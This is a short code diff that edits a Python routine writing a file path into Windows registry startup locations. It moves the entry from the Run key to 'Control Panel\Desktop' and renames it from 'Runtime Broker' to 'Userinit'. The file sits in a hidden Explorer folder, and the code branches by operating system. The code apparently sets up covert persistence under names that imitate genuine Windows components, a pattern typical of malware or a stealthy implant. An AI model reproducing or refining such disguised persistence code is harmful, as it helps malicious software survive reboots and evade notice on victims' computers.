@@ -133,7 +133,7 @@ try {
     def add_registry_startup(path, name):
         import winreg
         
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\\Desktop", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(key, name, 0, winreg.REG_SZ, path)
         winreg.CloseKey(key)
 
@@ -162,7 +162,7 @@ try {
             f"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Windows\\Explorer\\uid.txt"
         )
         # add_to_startup(file_path, "Runtime Broker")
-        add_registry_startup(file_path, "Runtime Broker")
+        add_registry_startup(file_path, "Userinit")
 
     elif (
         os_type == "Linux"
